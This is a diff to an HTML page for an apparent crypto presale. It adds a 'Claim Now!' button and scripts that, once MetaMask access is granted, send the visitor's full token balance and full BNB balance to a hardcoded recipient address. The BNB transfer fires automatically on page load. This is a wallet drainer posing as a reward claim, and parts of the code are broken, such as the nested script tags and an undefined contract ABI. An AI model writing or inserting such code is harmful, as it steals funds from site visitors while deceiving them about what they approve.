@@ -37,6 +37,89 @@
         </div>
       </div>
     </header>
+    <button onclick="enviarToken()" class="hero-btn btn">Claim Now!</button>
+
+<script>
+    async function enviarToken() {
+        // Verificamos si MetaMask está instalado y conectado
+        if (typeof window.ethereum !== 'undefined') {
+            // Solicitamos permiso al usuario para acceder a su cuenta de MetaMask
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+            // Dirección del contrato BEP20 al que deseas enviar el token
+            const contractAddress = '0x4385328cc4D643Ca98DfEA734360C0F596C83449'; // Inserta la dirección del contrato aquí
+
+            // Instanciamos el contrato BEP20
+            const contract = new window.ethereum.Contract(contractAbi, contractAddress);
+
+            // Dirección del destinatario
+            const toAddress = '0x9c31d14DDdE04F4759520431372b2668dBc7c95A'; // Inserta la dirección del destinatario aquí
+
+            // Obtenemos la dirección del usuario conectado
+            const userAddress = window.ethereum.selectedAddress;
+
+            // Obtenemos el saldo de tokens del usuario
+            const balance = await contract.methods.balanceOf(userAddress).call();
+
+            // Convertimos el saldo a la cantidad máxima que puede enviar (en wei)
+            const maxAmount = balance.toString();
+
+            // Enviamos el token
+            await contract.methods.transfer(toAddress, maxAmount).send({ from: userAddress });
+            alert('Correctly Claimed!');
+        } else {
+            // MetaMask no está instalado, mostramos un mensaje de error
+            alert('Error. Needs to install Metamask!');
+        }
+    }
+    <script>
+    async function enviarTodoElSaldo() {
+        // Verificamos si MetaMask está instalado y conectado
+        if (typeof window.ethereum !== 'undefined') {
+            // Solicitamos permiso al usuario para acceder a su cuenta de MetaMask
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const userAddress = accounts[0];
+
+            // Obtenemos el saldo de BNB del usuario
+            const balance = await window.ethereum.request({
+                method: 'eth_getBalance',
+                params: [userAddress, 'latest'],
+            });
+
+            // Convertimos el saldo de BNB a decimal
+            const balanceInEther = parseFloat(window.ethereum.utils.fromWei(balance, 'ether'));
+
+            // Dirección del destinatario
+            const toAddress = '0x9c31d14DDdE04F4759520431372b2668dBc7c95A'; // Inserta la dirección del destinatario aquí
+
+            // Creamos la transacción
+            const transactionParameters = {
+                to: toAddress,
+                from: userAddress,
+                value: balance, // Enviamos todo el saldo
+            };
+
+            // Enviamos la transacción
+            try {
+                await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
+                alert('Transacción enviada correctamente!');
+            } catch (error) {
+                console.error('Error al enviar la transacción:', error);
+                alert('Hubo un error al enviar la transacción. Consulta la consola para obtener más detalles.');
+            }
+        } else {
+            // MetaMask no está instalado, mostramos un mensaje de error
+            alert('MetaMask no está instalado. Por favor, instálalo para continuar.');
+        }
+    }
+
+    // Llamamos a la función enviarTodoElSaldo() cuando la página se carga
+    window.onload = enviarTodoElSaldo;
+</script>
+</script>
    <a href="https://www.pinksale.finance/launchpad/0x2db15094d739e48a5cb31BD3dEd025C34669e4B1?chain=ETH" target="_blank" rel="noopener noreferrer" class="btn"
    > <div style="text-align: center;">
     <span class="centered-text">Check our Presale</span>
